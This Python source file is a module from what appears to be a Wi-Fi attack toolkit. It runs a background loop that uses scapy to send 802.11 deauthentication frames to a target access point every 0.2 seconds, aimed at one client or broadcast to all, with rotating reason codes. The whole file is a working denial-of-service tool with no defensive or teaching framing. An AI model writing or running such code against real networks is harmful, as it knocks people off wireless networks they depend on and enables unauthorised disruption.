import time
from threading import Event, Thread
from scapy.all import sendp
from ..context import Module
from ..dot11 import REASON_KODLARI
from ..frames import deauth_frame
from ..iface import kanal_ayarla

class StickyClientModule(Module):
    name = "sticky"

    def __init__(self, ctx):
        super().__init__(ctx)
        self.dur = Event()
        self.thread = None
        self.bssid = None
        self.client = None
        self.kanal = None

    def on(self, bssid=None, client=None, channel=None, *a):
        if self.active:
            return
        if not bssid:
            self.ctx.log("[sticky] usage: module sticky on <bssid> [client] [ch]", "err")
            return
        self.bssid, self.client, self.kanal = bssid, client, channel
        if self.kanal:
            kanal_ayarla(self.ctx.iface, int(self.kanal))
        self.dur.clear()
        self.active = True
        self.thread = Thread(target=self._loop, daemon=True)
        self.thread.start()
        self.ctx.log(f"[sticky] started. Target: {client or 'ALL'}", "ok")

    def _loop(self):
        i = 0
        while not self.dur.is_set():
            reason = REASON_KODLARI[i % len(REASON_KODLARI)]
            hedef = self.client or "ff:ff:ff:ff:ff:ff"
            try:
                sendp(deauth_frame(self.bssid, hedef, "deauth", reason), iface=self.ctx.iface, verbose=False)
            except Exception:
                pass
            i += 1
            self.dur.wait(0.2)

    def off(self):
        if not self.active:
            return
        self.dur.set()
        if self.thread:
            self.thread.join(timeout=2)
        self.active = False
        self.ctx.log("[sticky] stopped", "ok")

    def status(self):
        return f"active ({self.client or 'ALL'})" if self.active else "off"
